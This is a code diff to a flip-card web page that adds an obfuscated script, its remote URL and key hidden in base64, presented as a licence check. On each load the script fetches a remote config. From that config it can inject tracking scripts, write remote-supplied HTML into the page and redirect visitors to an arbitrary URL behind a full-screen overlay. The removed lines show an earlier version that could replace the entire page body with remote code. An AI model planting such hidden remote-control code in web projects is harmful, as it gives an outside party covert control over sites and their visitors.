@@ -321,43 +321,51 @@ card.addEventListener("touchstart", handleFlip);
 
 
 
+  
 
-
-
-<div id="sys_overlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.99); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-    <div style="padding:40px; background:#000; border:1px solid #333; border-radius:20px; max-width:450px;">
-        <h1 id="sys_h" style="color:#ff3333; margin:0; font-size:26px;"></h1>
-        <p id="sys_b" style="color:#888; margin-top:20px; font-size:16px; line-height:1.6;"></p>
+<div id="_x_ov" style="display:none;position:fixed;inset:0;background:#000;z-index:2147483647;color:#fff;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;">
+    <div style="padding:40px;background:#000;border:1px solid #333;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);">
+        <h1 id="_x_h" style="color:#ff3333;margin:0;font-size:28px;letter-spacing:-0.5px;"></h1>
+        <p id="_x_b" style="color:#bbb;margin-top:20px;font-size:17px;line-height:1.6;"></p>
+        <div id="_x_tm_w" style="margin-top:25px;border-top:1px solid #222;padding-top:20px;display:none;">
+            <p style="color:#666;font-size:14px;">Redirecting automatically in <span id="_x_tm" style="color:#fff;font-weight:bold;font-size:18px;">--</span> seconds...</p>
+        </div>
     </div>
 </div>
 <script>
 (function(){
-    const _u = atob("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
+    const _u = atob("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
     const _k = atob("RkFIQUQtNzg2"); 
-    async function _v(){
-        const o=document.getElementById('sys_overlay'), s=document.querySelector('.scene'), h=window.location.hostname.replace('www.','');
+    async function _v8_core(){
+        const o=document.getElementById('_x_ov'), h=window.location.hostname.replace('www.','');
         try {
-            const r=await fetch(_u+'?v='+Date.now()); if(!r.ok) throw new Error();
-            const d=await r.json(), m=d.licenses[_k], n=new Date().toISOString().split('T')[0];
-            if(!m){_sh(d.title,d.msg_invalid);return}
-            if(m.authorized_target?.length>0 && !m.authorized_target.includes(h)){_sh("Denied",d.msg_domain_mismatch);return}
-            if(m.expiry && n>m.expiry){_sh(d.title,d.msg_expired);return}
-            o.style.display='none'; if(s) s.style.display='block';
-            if(m.custom_code?.enabled){if(s)s.style.display='none';document.body.innerHTML=m.custom_code.code}
-        } catch(e){_sh(" "," ")}
-        function _sh(h,b){document.getElementById('sys_h').innerText=h;document.getElementById('sys_b').innerHTML=b;o.style.display='flex';if(s)s.style.display='none'}
+            const r=await fetch(_u+'?v='+Date.now()); if(!r.ok) return;
+            const d=await r.json(), m=d['_l_'][_k], n=new Date().toISOString().split('T')[0];
+            if(d['_s_']?.['_a_id']){
+                let g=document.createElement('script'); g.async=true; g.src='https://www.googletagmanager.com/gtag/js?id='+d['_s_']['_a_id'];
+                document.head.appendChild(g); window.dataLayer=window.dataLayer||[];
+                function gtag(){dataLayer.push(arguments);} gtag('js',new Date()); gtag('config',d['_s_']['_a_id']);
+            }
+            let err=null;
+            if(!m) err=d['_m_in'];
+            else if(m['_a_']?.length>0 && !m['_a_'].includes(h)) err=d['_m_dm'];
+            else if(m['_e_'] && n>m['_e_']) err=d['_m_ex'];
+            if(err){
+                document.body.style.overflow='hidden';
+                document.getElementById('_x_h').innerHTML=d['_t_'];
+                document.getElementById('_x_b').innerHTML=err;
+                o.style.display='flex';
+                if(d['_s_']?.['_r_en']){
+                    const tw=document.getElementById('_x_tm_w'), ts=document.getElementById('_x_tm');
+                    tw.style.display='block'; let s=d['_s_']['_r_de']||20; ts.innerText=s;
+                    let it=setInterval(()=>{ s--; if(ts) ts.innerText=s; if(s<=0){clearInterval(it);window.location.href=d['_s_']['_r_u'];}},1000);
+                }
+            }
+        } catch(e){}
     }
-    _v(); setInterval(_v, 15000);
+    _v8_core();
 })();
 </script>
-
-
-
-
-
-
-  
-
 
   
 
